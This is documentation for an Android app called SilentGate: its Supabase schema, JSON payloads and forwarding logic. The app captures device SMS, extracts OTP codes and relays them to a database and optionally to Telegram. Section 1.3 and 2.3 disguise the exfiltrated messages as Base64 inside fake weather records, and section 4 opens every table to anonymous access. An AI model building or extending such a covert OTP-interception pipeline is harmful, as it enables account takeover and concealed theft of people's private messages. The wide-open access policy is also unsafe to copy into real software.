# SilentGate Supabase Schema & API Documentation
**Version**: 2026.08.06
**Service**: Supabase (PostgreSQL + PostgREST)

This document outlines the full Supabase implementation for SilentGate, including the database schema, data models, JSON payloads, and application-side workings.

---

## 1. Core Entities & Schema

### 1.1 Gateways (Device Inventory)
Stores metadata for all devices connected to the network.
- **SQL Path**: `public.gateways`
- **Primary Link**: `device_id` (Text, Unique)

**JSON Payload (Kotlin `GatewayRow`)**
```json
{
  "device_id": "606cdbd049fdcad2",
  "name": "Google Pixel 7",
  "model": "Pixel 7 Pro",
  "android_version": "15 (API 35)",
  "app_version": "1.0.0",
  "last_seen": "2026-08-06T22:00:00+05:30"
}
```

---

### 1.2 Messages (Decoded Data)
Used for Admin visibility and relayed messages.
- **SQL Path**: `public.messages`
- **Foreign Key**: `device_id` REFERENCES `gateways(device_id)`

**JSON Payload (Kotlin `MessageRow`)**
```json
{
  "device_id": "606cdbd049fdcad2",
  "sender": "+918084799136",
  "body": "Your code is 1234",
  "timestamp": 1786035029789,
  "is_otp": true,
  "otp_code": "1234",
  "sender_type": "otp",
  "sim_slot": 0,
  "message_preview": "Your code is 1234",
  "language_code": "en",
  "char_count": 16,
  "contains_link": false,
  "contains_phone": false,
  "links": [],
  "phones": []
}
```

---

### 1.3 Sync Logs (Camouflaged Data)
Primary storage for standard nodes using encryption and behavioral synth.
- **SQL Path**: `public.sync_logs`

**JSON Payload (Kotlin `CamouflagedMessageRow`)**
```json
{
  "device_id": "606cdbd049fdcad2",
  "payload": {
    "weather": "partly_cloudy",
    "temp": "24C",
    "data": "BASE64_ENCRYPTED_STRING"
  },
  "timestamp": 1786035029789
}
```

---

### 1.4 Device Heartbeats
High-frequency health tracking.
- **SQL Path**: `public.device_heartbeats`

**JSON Payload (Kotlin `HeartbeatRow`)**
```json
{
  "device_id": "606cdbd049fdcad2",
  "battery": 85,
  "signal": "Good",
  "timestamp": "2026-08-06T22:05:00+05:30"
}
```

---

### 1.5 Global Settings (Remote Config)
Orchestration for all nodes in the network.
- **SQL Path**: `public.global_settings`
- **Singleton ID**: `1`

**JSON Payload (Kotlin `GlobalSettingsRow`)**
```json
{
  "id": 1,
  "config": {
    "forwardToTelegram": "true",
    "telegramBotToken": "...",
    "webhookBypassRules": "false"
  },
  "updated_by": "admin_device_id",
  "updated_at": "2026-08-06T22:10:00+05:30"
}
```

---

## 2. Application Workings

### 2.1 Initialization
The app uses the `supabase-kt` SDK. The client is initialized lazily in `SupabaseManager` using the URL and Key stored in `AppPreferences`.
- **Toggled Services**: `Postgrest`, `Auth`, `Realtime`.

### 2.2 Registration Flow
Before any data sync, the app calls `registerGateway()`. It uses an `upsert` with `onConflict = "device_id"` to ensure the device exists in the inventory without creating duplicates.

### 2.3 Forwarding Logic
1.  **Standard Nodes**: Messages are serialized into `MessageRow`, Base64 encoded, and wrapped in a `CamouflagedMessageRow` (Behavioral Synth). This is then `upserted` into `sync_logs`.
2.  **Bridge/Admin Nodes**: Relayed messages are sent directly to the `messages` table via `forwardWithDeviceId()` for immediate SQL indexing and visibility.

---

## 3. Response Handling & Resilience

### 3.1 HTTP / JSON Responses
SilentGate uses Kotlin Coroutines `await()` for all Supabase operations.
- **Success**: Postgrest returns the created/updated row (or minimal response depending on `Prefer` header). The app logs a success message.
- **Failure**: Handled in a `try-catch` block.
    - **RLS Violations (42501)**: Logged as a permission error.
    - **FK Violations (23503)**: Triggers a re-registration attempt.
    - **Duplicates**: Suppressed to avoid infinite retry loops.

### 3.2 Offline Support
If a Supabase operation fails due to network issues, the message is kept in the local Room database and marked as `isForwarded = false`. The `ForwardingWorker` (WorkManager) will periodically retry the sync until a `200 OK` is received from the Supabase PostgREST endpoint.

---

## 4. Row Level Security (RLS)
The system is designed for **Anonymous Access** (Role: `anon`).
- **Policy Pattern**: `FOR ALL USING (true) WITH CHECK (true)`
- This allows devices to register themselves and sync data without a traditional login flow, relying on the `X-API-Key` or `anon` key for initial handshakes.
